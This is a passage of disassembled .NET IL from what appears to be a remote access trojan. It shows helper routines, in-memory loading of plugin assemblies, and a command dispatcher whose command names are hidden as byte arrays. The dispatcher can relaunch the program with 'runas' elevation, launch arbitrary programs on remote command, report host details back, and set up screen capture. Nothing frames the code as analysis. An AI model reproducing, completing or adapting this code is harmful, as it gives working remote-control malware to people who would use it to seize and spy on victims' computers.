    IL_0025:  br.s       IL_0027

    IL_0027:  ldloc.1
    IL_0028:  ret
  } // end of method BasicFunctions::SP

  .method public static string  M(uint8[] B) cil managed
  {
    // Code size       67 (0x43)
    .maxstack  3
    .locals init (string V_0,
             uint8 V_1,
             string V_2,
             int32 V_3,
             uint8[] V_4)
    IL_0000:  newobj     instance void [mscorlib]System.Security.Cryptography.MD5CryptoServiceProvider::.ctor()
    IL_0005:  ldarg.0
    IL_0006:  callvirt   instance uint8[] [mscorlib]System.Security.Cryptography.HashAlgorithm::ComputeHash(uint8[])
    IL_000b:  starg.s    B
    IL_000d:  ldstr      ""
    IL_0012:  stloc.2
    IL_0013:  ldarg.0
    IL_0014:  stloc.s    V_4
    IL_0016:  ldc.i4.0
    IL_0017:  stloc.3
    IL_0018:  br.s       IL_0036

    IL_001a:  ldloc.s    V_4
    IL_001c:  ldloc.3
    IL_001d:  ldelem.u1
    IL_001e:  stloc.1
    IL_001f:  ldloc.2
    IL_0020:  ldloca.s   V_1
    IL_0022:  ldstr      "x2"
    IL_0027:  call       instance string [mscorlib]System.Byte::ToString(string)
    IL_002c:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0031:  stloc.2
    IL_0032:  ldloc.3
    IL_0033:  ldc.i4.1
    IL_0034:  add.ovf
    IL_0035:  stloc.3
    IL_0036:  ldloc.3
    IL_0037:  ldloc.s    V_4
    IL_0039:  ldlen
    IL_003a:  conv.ovf.i4
    IL_003b:  blt.s      IL_001a

    IL_003d:  ldloc.2
    IL_003e:  stloc.0
    IL_003f:  br.s       IL_0041

    IL_0041:  ldloc.0
    IL_0042:  ret
  } // end of method BasicFunctions::M

  .method private static pinvokeimpl("ntdll" winapi) 
          int32  NF(native int hProcess,
                    int32 processInformationClass,
                    int32& processInformation,
                    int32 processInformationLength) cil managed preservesig
  {
  }
  .method public static object  XR(uint8[] b,
                                   string Srt,
                                   bool Bo) cil managed
  {
    // Code size       227 (0xe3)
    .maxstack  5
    .locals init (class [mscorlib]System.Reflection.Module V_0,
             object V_1,
             class [mscorlib]System.Type V_2,
             int32 V_3,
             class [mscorlib]System.Reflection.Module[] V_4,
             int32 V_5,
             class [mscorlib]System.Type[] V_6,
             uint8[] V_7)
    IL_0000:  ldarg.0
    IL_0001:  call       class [mscorlib]System.Reflection.Assembly [mscorlib]System.Reflection.Assembly::Load(uint8[])
    IL_0006:  callvirt   instance class [mscorlib]System.Reflection.Module[] [mscorlib]System.Reflection.Assembly::GetModules()
    IL_000b:  stloc.s    V_4
    IL_000d:  ldc.i4.0
    IL_000e:  stloc.3
    IL_000f:  br         IL_00d3

    IL_0014:  ldloc.s    V_4
    IL_0016:  ldloc.3
    IL_0017:  ldelem.ref
    IL_0018:  stloc.0
    IL_0019:  ldloc.0
    IL_001a:  callvirt   instance class [mscorlib]System.Type[] [mscorlib]System.Reflection.Module::GetTypes()
    IL_001f:  stloc.s    V_6
    IL_0021:  ldc.i4.0
    IL_0022:  stloc.s    V_5
    IL_0024:  br         IL_00c4

    IL_0029:  ldloc.s    V_6
    IL_002b:  ldloc.s    V_5
    IL_002d:  ldelem.ref
    IL_002e:  stloc.2
    IL_002f:  ldarg.2
    IL_0030:  brfalse.s  IL_0092

    IL_0032:  ldloc.2
    IL_0033:  callvirt   instance string [mscorlib]System.Type::get_FullName()
    IL_0038:  ldstr      "."
    IL_003d:  ldc.i4.6
    IL_003e:  newarr     [mscorlib]System.Byte
    IL_0043:  stloc.s    V_7
    IL_0045:  ldloc.s    V_7
    IL_0047:  ldc.i4.0
    IL_0048:  ldc.i4.s   78
    IL_004a:  stelem.i1
    IL_004b:  ldloc.s    V_7
    IL_004d:  ldc.i4.1
    IL_004e:  ldc.i4.s   67
    IL_0050:  stelem.i1
    IL_0051:  ldloc.s    V_7
    IL_0053:  ldc.i4.2
    IL_0054:  ldc.i4.s   111
    IL_0056:  stelem.i1
    IL_0057:  ldloc.s    V_7
    IL_0059:  ldc.i4.3
    IL_005a:  ldc.i4.s   100
    IL_005c:  stelem.i1
    IL_005d:  ldloc.s    V_7
    IL_005f:  ldc.i4.4
    IL_0060:  ldc.i4.s   101
    IL_0062:  stelem.i1
    IL_0063:  ldloc.s    V_7
    IL_0065:  ldc.i4.5
    IL_0066:  ldc.i4.s   99
    IL_0068:  stelem.i1
    IL_0069:  ldloc.s    V_7
    IL_006b:  call       string Q.BasicFunctions::StrToBi(uint8[])
    IL_0070:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_0075:  callvirt   instance bool [mscorlib]System.String::EndsWith(string)
    IL_007a:  brfalse.s  IL_0090

    IL_007c:  ldloc.0
    IL_007d:  callvirt   instance class [mscorlib]System.Reflection.Assembly [mscorlib]System.Reflection.Module::get_Assembly()
    IL_0082:  ldloc.2
    IL_0083:  callvirt   instance string [mscorlib]System.Type::get_FullName()
    IL_0088:  callvirt   instance object [mscorlib]System.Reflection.Assembly::CreateInstance(string)
    IL_008d:  stloc.1
    IL_008e:  br.s       IL_00e1

    IL_0090:  br.s       IL_00be

    IL_0092:  ldloc.2
    IL_0093:  callvirt   instance string [mscorlib]System.Type::get_FullName()
    IL_0098:  ldstr      "."
    IL_009d:  ldarg.1
    IL_009e:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_00a3:  callvirt   instance bool [mscorlib]System.String::EndsWith(string)
    IL_00a8:  brfalse.s  IL_00be

    IL_00aa:  ldloc.0
    IL_00ab:  callvirt   instance class [mscorlib]System.Reflection.Assembly [mscorlib]System.Reflection.Module::get_Assembly()
    IL_00b0:  ldloc.2
    IL_00b1:  callvirt   instance string [mscorlib]System.Type::get_FullName()
    IL_00b6:  callvirt   instance object [mscorlib]System.Reflection.Assembly::CreateInstance(string)
    IL_00bb:  stloc.1
    IL_00bc:  br.s       IL_00e1

    IL_00be:  ldloc.s    V_5
    IL_00c0:  ldc.i4.1
    IL_00c1:  add.ovf
    IL_00c2:  stloc.s    V_5
    IL_00c4:  ldloc.s    V_5
    IL_00c6:  ldloc.s    V_6
    IL_00c8:  ldlen
    IL_00c9:  conv.ovf.i4
    IL_00ca:  blt        IL_0029

    IL_00cf:  ldloc.3
    IL_00d0:  ldc.i4.1
    IL_00d1:  add.ovf
    IL_00d2:  stloc.3
    IL_00d3:  ldloc.3
    IL_00d4:  ldloc.s    V_4
    IL_00d6:  ldlen
    IL_00d7:  conv.ovf.i4
    IL_00d8:  blt        IL_0014

    IL_00dd:  ldnull
    IL_00de:  stloc.1
    IL_00df:  br.s       IL_00e1

    IL_00e1:  ldloc.1
    IL_00e2:  ret
  } // end of method BasicFunctions::XR

  .method public static string  StrToBi(uint8[] SD) cil managed
  {
    // Code size       42 (0x2a)
    .maxstack  2
    .locals init (string V_0,
             string V_1,
             string V_2,
             class [mscorlib]System.Exception V_3)
    IL_0000:  ldsfld     string [mscorlib]System.String::Empty
    IL_0005:  stloc.0
    .try
    {
      IL_0006:  call       class [mscorlib]System.Text.Encoding [mscorlib]System.Text.Encoding::get_ASCII()
      IL_000b:  ldarg.0
      IL_000c:  callvirt   instance string [mscorlib]System.Text.Encoding::GetString(uint8[])
      IL_0011:  stloc.2
      IL_0012:  ldloc.2
      IL_0013:  stloc.0
      IL_0014:  leave.s    IL_0024

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0016:  dup
      IL_0017:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_001c:  stloc.3
      IL_001d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0022:  leave.s    IL_0024

    }  // end handler
    IL_0024:  ldloc.0
    IL_0025:  stloc.1
    IL_0026:  br.s       IL_0028

    IL_0028:  ldloc.1
    IL_0029:  ret
  } // end of method BasicFunctions::StrToBi

} // end of class Q.BasicFunctions

.class public auto ansi Q.DataRequist
       extends [mscorlib]System.Object
{
  .method public specialname rtspecialname 
          instance void  .ctor() cil managed
  {
    // Code size       7 (0x7)
    .maxstack  8
    IL_0000:  ldarg.0
    IL_0001:  call       instance void [mscorlib]System.Object::.ctor()
    IL_0006:  ret
  } // end of method DataRequist::.ctor

  .method public static void  ProcessingData(uint8[] b) cil managed
  {
    // Code size       6272 (0x1880)
    .maxstack  9
    .locals init (string V_0,
             string[] V_1,
             uint8[] V_2,
             uint8[] V_3,
             uint8[] V_4,
             uint8[] V_5,
             uint8[] V_6,
             uint8[] V_7,
             uint8[] V_8,
             uint8[] V_9,
             uint8[] V_10,
             uint8[] V_11,
             uint8[] V_12,
             uint8[] V_13,
             uint8[] V_14,
             uint8[] V_15,
             uint8[] V_16,
             uint8[] V_17,
             uint8[] V_18,
             uint8[] V_19,
             uint8[] V_20,
             uint8[] V_21,
             class [System]System.Net.WebClient V_22,
             class [System]System.Net.WebClient V_23,
             uint8[] V_24,
             uint8[] V_25,
             string V_26,
             string V_27,
             string V_28,
             class [System]System.Diagnostics.ProcessStartInfo V_29,
             int32 V_30,
             int32 V_31,
             class [mscorlib]System.Exception V_32,
             int32 V_33,
             int32 V_34,
             class [mscorlib]System.Exception V_35,
             int32 V_36,
             class [mscorlib]System.IO.MemoryStream V_37,
             class [mscorlib]System.Exception V_38,
             uint8[] V_39,
             class [mscorlib]System.Exception V_40,
             uint8[] V_41,
             uint8[] V_42,
             class [mscorlib]System.Exception V_43,
             uint8[] V_44,
             object V_45,
             uint8[] V_46,
             int32 V_47,
             class [mscorlib]System.IO.MemoryStream V_48,
             class [mscorlib]System.Exception V_49,
             uint8[] V_50,
             object V_51,
             int32 V_52,
             class [mscorlib]System.IO.MemoryStream V_53,
             class [mscorlib]System.Exception V_54,
             uint8[] V_55,
             uint8[] V_56,
             object V_57,
             int32 V_58,
             class [mscorlib]System.IO.MemoryStream V_59,
             class [mscorlib]System.Exception V_60,
             uint8[] V_61,
             uint8[] V_62,
             object V_63,
             string V_64,
             int32 V_65,
             class [mscorlib]System.IO.MemoryStream V_66,
             class [mscorlib]System.Exception V_67,
             uint8[] V_68,
             uint8[] V_69,
             object V_70,
             string V_71,
             int32 V_72,
             class [mscorlib]System.IO.MemoryStream V_73,
             class [mscorlib]System.Exception V_74,
             uint8[] V_75,
             object V_76,
             int32 V_77,
             class [mscorlib]System.IO.MemoryStream V_78,
             class [mscorlib]System.Exception V_79,
             class [System.Drawing]System.Drawing.Graphics V_80,
             class [mscorlib]System.IO.MemoryStream V_81,
             class [mscorlib]System.IO.MemoryStream V_82,
             class [System.Drawing]System.Drawing.Bitmap V_83,
             class [mscorlib]System.Exception V_84,
             uint8[] V_85,
             uint8[] V_86,
             uint8[] V_87,
             uint8[] V_88,
             uint8[] V_89,
             int32 V_90,
             class [mscorlib]System.IO.MemoryStream V_91,
             class [mscorlib]System.Exception V_92,
             uint8[] V_93,
             class [mscorlib]System.Exception V_94,
             uint8[] V_95,
             class [mscorlib]System.Exception V_96,
             uint8[] V_97,
             int32 V_98,
             int32 V_99,
             uint8[] V_100,
             uint8[] V_101,
             uint8[] V_102,
             class [mscorlib]System.IO.MemoryStream V_103,
             class [mscorlib]System.Exception V_104,
             class [mscorlib]System.Exception V_105,
             class [mscorlib]System.Exception V_106,
             string V_107,
             string V_108,
             uint8[] V_109,
             string[] V_110,
             string V_111,
             object[] V_112,
             valuetype [System.Drawing]System.Drawing.Rectangle V_113,
             valuetype [System.Drawing]System.Drawing.Rectangle V_114,
             valuetype [System.Drawing]System.Drawing.Rectangle V_115,
             valuetype [System.Drawing]System.Drawing.Rectangle V_116,
             valuetype [System.Drawing]System.Drawing.Rectangle V_117,
             valuetype [System.Drawing]System.Drawing.Rectangle V_118,
             valuetype [System.Drawing]System.Drawing.Rectangle V_119,
             valuetype [System.Drawing]System.Drawing.Rectangle V_120,
             valuetype [System.Drawing]System.Drawing.Rectangle V_121,
             valuetype [System.Drawing]System.Drawing.Size V_122,
             native int V_123,
             string V_124,
             uint8[] V_125,
             object[] V_126,
             bool[] V_127,
             uint8[] V_128)
    IL_0000:  ldstr      ""
    IL_0005:  stloc.0
    IL_0006:  ldarga.s   b
    IL_0008:  call       string Q.BasicFunctions::BS(uint8[]&)
    IL_000d:  ldsfld     string Q.SettingPad::Y
    IL_0012:  ldc.i4.m1
    IL_0013:  ldc.i4.0
    IL_0014:  call       string[] [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::Split(string,
                                                                                              string,
                                                                                              int32,
                                                                                              valuetype [Microsoft.VisualBasic]Microsoft.VisualBasic.CompareMethod)
    IL_0019:  stloc.1
    .try
    {
      IL_001a:  ldloc.1
      IL_001b:  ldc.i4.0
      IL_001c:  ldelem.ref
      IL_001d:  stloc.s    V_28
      IL_001f:  ldc.i4.3
      IL_0020:  newarr     [mscorlib]System.Byte
      IL_0025:  stloc.s    V_128
      IL_0027:  ldloc.s    V_128
      IL_0029:  ldc.i4.0
      IL_002a:  ldc.i4.s   97
      IL_002c:  stelem.i1
      IL_002d:  ldloc.s    V_128
      IL_002f:  ldc.i4.1
      IL_0030:  ldc.i4.s   100
      IL_0032:  stelem.i1
      IL_0033:  ldloc.s    V_128
      IL_0035:  ldc.i4.2
      IL_0036:  ldc.i4.s   105
      IL_0038:  stelem.i1
      IL_0039:  ldloc.s    V_128
      IL_003b:  stloc.2
      IL_003c:  ldc.i4.2
      IL_003d:  newarr     [mscorlib]System.Byte
      IL_0042:  stloc.s    V_128
      IL_0044:  ldloc.s    V_128
      IL_0046:  ldc.i4.0
      IL_0047:  ldc.i4.s   71
      IL_0049:  stelem.i1
      IL_004a:  ldloc.s    V_128
      IL_004c:  ldc.i4.1
      IL_004d:  ldc.i4.s   99
      IL_004f:  stelem.i1
      IL_0050:  ldloc.s    V_128
      IL_0052:  stloc.3
      IL_0053:  ldc.i4.5
      IL_0054:  newarr     [mscorlib]System.Byte
      IL_0059:  stloc.s    V_128
      IL_005b:  ldloc.s    V_128
      IL_005d:  ldc.i4.0
      IL_005e:  ldc.i4.s   114
      IL_0060:  stelem.i1
      IL_0061:  ldloc.s    V_128
      IL_0063:  ldc.i4.1
      IL_0064:  ldc.i4.s   117
      IL_0066:  stelem.i1
      IL_0067:  ldloc.s    V_128
      IL_0069:  ldc.i4.2
      IL_006a:  ldc.i4.s   110
      IL_006c:  stelem.i1
      IL_006d:  ldloc.s    V_128
      IL_006f:  ldc.i4.3
      IL_0070:  ldc.i4.s   97
      IL_0072:  stelem.i1
      IL_0073:  ldloc.s    V_128
      IL_0075:  ldc.i4.4
      IL_0076:  ldc.i4.s   115
      IL_0078:  stelem.i1
      IL_0079:  ldloc.s    V_128
      IL_007b:  stloc.s    V_4
      IL_007d:  ldc.i4.1
      IL_007e:  newarr     [mscorlib]System.Byte
      IL_0083:  stloc.s    V_128
      IL_0085:  ldloc.s    V_128
      IL_0087:  ldc.i4.0
      IL_0088:  ldc.i4.s   116
      IL_008a:  stelem.i1
      IL_008b:  ldloc.s    V_128
      IL_008d:  stloc.s    V_5
      IL_008f:  ldc.i4.4
      IL_0090:  newarr     [mscorlib]System.Byte
      IL_0095:  stloc.s    V_128
      IL_0097:  ldloc.s    V_128
      IL_0099:  ldc.i4.0
      IL_009a:  ldc.i4.s   115
      IL_009c:  stelem.i1
      IL_009d:  ldloc.s    V_128
      IL_009f:  ldc.i4.1
      IL_00a0:  ldc.i4.s   114
      IL_00a2:  stelem.i1
      IL_00a3:  ldloc.s    V_128
      IL_00a5:  ldc.i4.2
      IL_00a6:  ldc.i4.s   118
      IL_00a8:  stelem.i1
      IL_00a9:  ldloc.s    V_128
      IL_00ab:  ldc.i4.3
      IL_00ac:  ldc.i4.s   49
      IL_00ae:  stelem.i1
      IL_00af:  ldloc.s    V_128
      IL_00b1:  stloc.s    V_6
      IL_00b3:  ldc.i4.2
      IL_00b4:  newarr     [mscorlib]System.Byte
      IL_00b9:  stloc.s    V_128
      IL_00bb:  ldloc.s    V_128
      IL_00bd:  ldc.i4.0
      IL_00be:  ldc.i4.s   108
      IL_00c0:  stelem.i1
      IL_00c1:  ldloc.s    V_128
      IL_00c3:  ldc.i4.1
      IL_00c4:  ldc.i4.s   108
      IL_00c6:  stelem.i1
      IL_00c7:  ldloc.s    V_128
      IL_00c9:  stloc.s    V_7
      IL_00cb:  ldc.i4.3
      IL_00cc:  newarr     [mscorlib]System.Byte
      IL_00d1:  stloc.s    V_128
      IL_00d3:  ldloc.s    V_128
      IL_00d5:  ldc.i4.0
      IL_00d6:  ldc.i4.s   115
      IL_00d8:  stelem.i1
      IL_00d9:  ldloc.s    V_128
      IL_00db:  ldc.i4.1
      IL_00dc:  ldc.i4.s   117
      IL_00de:  stelem.i1
      IL_00df:  ldloc.s    V_128
      IL_00e1:  ldc.i4.2
      IL_00e2:  ldc.i4.s   115
      IL_00e4:  stelem.i1
      IL_00e5:  ldloc.s    V_128
      IL_00e7:  stloc.s    V_8
      IL_00e9:  ldc.i4.3
      IL_00ea:  newarr     [mscorlib]System.Byte
      IL_00ef:  stloc.s    V_128
      IL_00f1:  ldloc.s    V_128
      IL_00f3:  ldc.i4.0
      IL_00f4:  ldc.i4.s   114
      IL_00f6:  stelem.i1
      IL_00f7:  ldloc.s    V_128
      IL_00f9:  ldc.i4.1
      IL_00fa:  ldc.i4.s   101
      IL_00fc:  stelem.i1
      IL_00fd:  ldloc.s    V_128
      IL_00ff:  ldc.i4.2
      IL_0100:  ldc.i4.s   115
      IL_0102:  stelem.i1
      IL_0103:  ldloc.s    V_128
      IL_0105:  stloc.s    V_9
      IL_0107:  ldc.i4.2
      IL_0108:  newarr     [mscorlib]System.Byte
      IL_010d:  stloc.s    V_128
      IL_010f:  ldloc.s    V_128
      IL_0111:  ldc.i4.0
      IL_0112:  ldc.i4.s   114
      IL_0114:  stelem.i1
      IL_0115:  ldloc.s    V_128
      IL_0117:  ldc.i4.1
      IL_0118:  ldc.i4.s   110
      IL_011a:  stelem.i1
      IL_011b:  ldloc.s    V_128
      IL_011d:  stloc.s    V_10
      IL_011f:  ldc.i4.2
      IL_0120:  newarr     [mscorlib]System.Byte
      IL_0125:  stloc.s    V_128
      IL_0127:  ldloc.s    V_128
      IL_0129:  ldc.i4.0
      IL_012a:  ldc.i4.s   80
      IL_012c:  stelem.i1
      IL_012d:  ldloc.s    V_128
      IL_012f:  ldc.i4.1
      IL_0130:  ldc.i4.s   105
      IL_0132:  stelem.i1
      IL_0133:  ldloc.s    V_128
      IL_0135:  stloc.s    V_11
      IL_0137:  ldc.i4.2
      IL_0138:  newarr     [mscorlib]System.Byte
      IL_013d:  stloc.s    V_128
      IL_013f:  ldloc.s    V_128
      IL_0141:  ldc.i4.0
      IL_0142:  ldc.i4.s   84
      IL_0144:  stelem.i1
      IL_0145:  ldloc.s    V_128
      IL_0147:  ldc.i4.1
      IL_0148:  ldc.i4.s   105
      IL_014a:  stelem.i1
      IL_014b:  ldloc.s    V_128
      IL_014d:  stloc.s    V_12
      IL_014f:  ldc.i4.3
      IL_0150:  newarr     [mscorlib]System.Byte
      IL_0155:  stloc.s    V_128
      IL_0157:  ldloc.s    V_128
      IL_0159:  ldc.i4.0
      IL_015a:  ldc.i4.s   105
      IL_015c:  stelem.i1
      IL_015d:  ldloc.s    V_128
      IL_015f:  ldc.i4.1
      IL_0160:  ldc.i4.s   110
      IL_0162:  stelem.i1
      IL_0163:  ldloc.s    V_128
      IL_0165:  ldc.i4.2
      IL_0166:  ldc.i4.s   118
      IL_0168:  stelem.i1
      IL_0169:  ldloc.s    V_128
      IL_016b:  stloc.s    V_14
      IL_016d:  ldc.i4.3
      IL_016e:  newarr     [mscorlib]System.Byte
      IL_0173:  stloc.s    V_128
      IL_0175:  ldloc.s    V_128
      IL_0177:  ldc.i4.0
      IL_0178:  ldc.i4.s   114
      IL_017a:  stelem.i1
      IL_017b:  ldloc.s    V_128
      IL_017d:  ldc.i4.1
      IL_017e:  ldc.i4.s   101
      IL_0180:  stelem.i1
      IL_0181:  ldloc.s    V_128
      IL_0183:  ldc.i4.2
      IL_0184:  ldc.i4.s   116
      IL_0186:  stelem.i1
      IL_0187:  ldloc.s    V_128
      IL_0189:  stloc.s    V_15
      IL_018b:  ldc.i4.3
      IL_018c:  newarr     [mscorlib]System.Byte
      IL_0191:  stloc.s    V_128
      IL_0193:  ldloc.s    V_128
      IL_0195:  ldc.i4.0
      IL_0196:  ldc.i4.s   112
      IL_0198:  stelem.i1
      IL_0199:  ldloc.s    V_128
      IL_019b:  ldc.i4.1
      IL_019c:  ldc.i4.s   120
      IL_019e:  stelem.i1
      IL_019f:  ldloc.s    V_128
      IL_01a1:  ldc.i4.2
      IL_01a2:  ldc.i4.s   114
      IL_01a4:  stelem.i1
      IL_01a5:  ldloc.s    V_128
      IL_01a7:  stloc.s    V_16
      IL_01a9:  ldc.i4.4
      IL_01aa:  newarr     [mscorlib]System.Byte
      IL_01af:  stloc.s    V_128
      IL_01b1:  ldloc.s    V_128
      IL_01b3:  ldc.i4.0
      IL_01b4:  ldc.i4.s   114
      IL_01b6:  stelem.i1
      IL_01b7:  ldloc.s    V_128
      IL_01b9:  ldc.i4.1
      IL_01ba:  ldc.i4.s   101
      IL_01bc:  stelem.i1
      IL_01bd:  ldloc.s    V_128
      IL_01bf:  ldc.i4.2
      IL_01c0:  ldc.i4.s   97
      IL_01c2:  stelem.i1
      IL_01c3:  ldloc.s    V_128
      IL_01c5:  ldc.i4.3
      IL_01c6:  ldc.i4.s   110
      IL_01c8:  stelem.i1
      IL_01c9:  ldloc.s    V_128
      IL_01cb:  stloc.s    V_17
      IL_01cd:  ldc.i4.4
      IL_01ce:  newarr     [mscorlib]System.Byte
      IL_01d3:  stloc.s    V_128
      IL_01d5:  ldloc.s    V_128
      IL_01d7:  ldc.i4.0
      IL_01d8:  ldc.i4.s   82
      IL_01da:  stelem.i1
      IL_01db:  ldloc.s    V_128
      IL_01dd:  ldc.i4.1
      IL_01de:  ldc.i4.s   69
      IL_01e0:  stelem.i1
      IL_01e1:  ldloc.s    V_128
      IL_01e3:  ldc.i4.2
      IL_01e4:  ldc.i4.s   69
      IL_01e6:  stelem.i1
      IL_01e7:  ldloc.s    V_128
      IL_01e9:  ldc.i4.3
      IL_01ea:  ldc.i4.s   84
      IL_01ec:  stelem.i1
      IL_01ed:  ldloc.s    V_128
      IL_01ef:  stloc.s    V_18
      IL_01f1:  ldc.i4.2
      IL_01f2:  newarr     [mscorlib]System.Byte
      IL_01f7:  stloc.s    V_128
      IL_01f9:  ldloc.s    V_128
      IL_01fb:  ldc.i4.0
      IL_01fc:  ldc.i4.s   114
      IL_01fe:  stelem.i1
      IL_01ff:  ldloc.s    V_128
      IL_0201:  ldc.i4.1
      IL_0202:  ldc.i4.s   101
      IL_0204:  stelem.i1
      IL_0205:  ldloc.s    V_128
      IL_0207:  stloc.s    V_19
      IL_0209:  ldc.i4.3
      IL_020a:  newarr     [mscorlib]System.Byte
      IL_020f:  stloc.s    V_128
      IL_0211:  ldloc.s    V_128
      IL_0213:  ldc.i4.0
      IL_0214:  ldc.i4.s   67
      IL_0216:  stelem.i1
      IL_0217:  ldloc.s    V_128
      IL_0219:  ldc.i4.1
      IL_021a:  ldc.i4.s   65
      IL_021c:  stelem.i1
      IL_021d:  ldloc.s    V_128
      IL_021f:  ldc.i4.2
      IL_0220:  ldc.i4.s   80
      IL_0222:  stelem.i1
      IL_0223:  ldloc.s    V_128
      IL_0225:  stloc.s    V_20
      IL_0227:  ldc.i4.2
      IL_0228:  newarr     [mscorlib]System.Byte
      IL_022d:  stloc.s    V_128
      IL_022f:  ldloc.s    V_128
      IL_0231:  ldc.i4.0
      IL_0232:  ldc.i4.s   117
      IL_0234:  stelem.i1
      IL_0235:  ldloc.s    V_128
      IL_0237:  ldc.i4.1
      IL_0238:  ldc.i4.s   110
      IL_023a:  stelem.i1
      IL_023b:  ldloc.s    V_128
      IL_023d:  stloc.s    V_24
      IL_023f:  ldc.i4.2
      IL_0240:  newarr     [mscorlib]System.Byte
      IL_0245:  stloc.s    V_128
      IL_0247:  ldloc.s    V_128
      IL_0249:  ldc.i4.0
      IL_024a:  ldc.i4.s   117
      IL_024c:  stelem.i1
      IL_024d:  ldloc.s    V_128
      IL_024f:  ldc.i4.1
      IL_0250:  ldc.i4.s   112
      IL_0252:  stelem.i1
      IL_0253:  ldloc.s    V_128
      IL_0255:  stloc.s    V_25
      IL_0257:  ldloc.s    V_28
      IL_0259:  stloc.s    V_107
      IL_025b:  ldloc.s    V_107
      IL_025d:  ldloc.3
      IL_025e:  call       string Q.BasicFunctions::StrToBi(uint8[])
      IL_0263:  ldc.i4.0
      IL_0264:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0269:  ldc.i4.0
      IL_026a:  bne.un.s   IL_0289

      IL_026c:  ldloc.3
      IL_026d:  call       string Q.BasicFunctions::StrToBi(uint8[])
      IL_0272:  ldsfld     string Q.SettingPad::Y
      IL_0277:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_027c:  stloc.0
      IL_027d:  ldloc.0
      IL_027e:  call       bool Q.BasicFunctions::SendIt(string)
      IL_0283:  pop
      IL_0284:  br         IL_0411

      IL_0289:  ldloc.s    V_107
      IL_028b:  ldloc.2
      IL_028c:  call       string Q.BasicFunctions::StrToBi(uint8[])
      IL_0291:  ldc.i4.0
      IL_0292:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0297:  ldc.i4.0
      IL_0298:  bne.un.s   IL_02f8

      IL_029a:  newobj     instance void [System]System.Diagnostics.ProcessStartInfo::.ctor()
      IL_029f:  stloc.s    V_29
      IL_02a1:  ldloc.s    V_29
      IL_02a3:  ldc.i4.1
      IL_02a4:  callvirt   instance void [System]System.Diagnostics.ProcessStartInfo::set_WindowStyle(valuetype [System]System.Diagnostics.ProcessWindowStyle)
      IL_02a9:  ldloc.s    V_29
      IL_02ab:  ldc.i4.1
      IL_02ac:  callvirt   instance void [System]System.Diagnostics.ProcessStartInfo::set_UseShellExecute(bool)
      IL_02b1:  ldloc.s    V_29
      IL_02b3:  ldsfld     class [mscorlib]System.IO.FileInfo Q.SettingPad::LO
      IL_02b8:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_02bd:  callvirt   instance void [System]System.Diagnostics.ProcessStartInfo::set_FileName(string)
      IL_02c2:  ldloc.s    V_29
      IL_02c4:  ldstr      ""
      IL_02c9:  callvirt   instance void [System]System.Diagnostics.ProcessStartInfo::set_WorkingDirectory(string)
      IL_02ce:  ldloc.s    V_29
      IL_02d0:  ldloc.s    V_4
      IL_02d2:  call       string Q.BasicFunctions::StrToBi(uint8[])
      IL_02d7:  callvirt   instance void [System]System.Diagnostics.ProcessStartInfo::set_Verb(string)
      IL_02dc:  ldloc.s    V_29
      IL_02de:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(class [System]System.Diagnostics.ProcessStartInfo)
      IL_02e3:  pop
      IL_02e4:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetCurrentProcess()
      IL_02e9:  callvirt   instance void [System]System.Diagnostics.Process::Kill()
      IL_02ee:  br         IL_0411

      IL_02f3:  br         IL_0411

      IL_02f8:  ldloc.s    V_107
      IL_02fa:  ldloc.s    V_5
      IL_02fc:  call       string Q.BasicFunctions::StrToBi(uint8[])
      IL_0301:  ldc.i4.0
      IL_0302:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0307:  ldc.i4.0
      IL_0308:  bne.un.s   IL_0318

      IL_030a:  ldloc.1
      IL_030b:  ldc.i4.1
      IL_030c:  ldelem.ref
      IL_030d:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
      IL_0312:  pop
      IL_0313:  br         IL_0411

      IL_0318:  ldloc.s    V_107
      IL_031a:  ldloc.s    V_6
      IL_031c:  call       string Q.BasicFunctions::StrToBi(uint8[])
      IL_0321:  ldc.i4.0
      IL_0322:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0327:  ldc.i4.0
      IL_0328:  bne.un.s   IL_0352

      IL_032a:  ldloc.s    V_6
      IL_032c:  call       string Q.BasicFunctions::StrToBi(uint8[])
      IL_0331:  ldsfld     string Q.SettingPad::Y
      IL_0336:  call       string Q.Accessories::GetInstall()
      IL_033b:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string)
      IL_0340:  stloc.0
      IL_0341:  ldloc.0
      IL_0342:  call       bool Q.BasicFunctions::SendIt(string)
      IL_0347:  pop
      IL_0348:  br         IL_0411

      IL_034d:  br         IL_0411

      IL_0352:  ldloc.s    V_107
      IL_0354:  ldloc.s    V_7
      IL_0356:  call       string Q.BasicFunctions::StrToBi(uint8[])
      IL_035b:  ldc.i4.0
      IL_035c:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0361:  ldc.i4.0
      IL_0362:  bne.un.s   IL_0374

      IL_0364:  ldc.i4.0
      IL_0365:  stsfld     bool Q.SettingPad::Cn
      IL_036a:  leave      IL_187f

      IL_036f:  br         IL_0411

      IL_0374:  ldloc.s    V_107
      IL_0376:  ldloc.s    V_8
      IL_0378:  call       string Q.BasicFunctions::StrToBi(uint8[])
      IL_037d:  ldc.i4.0
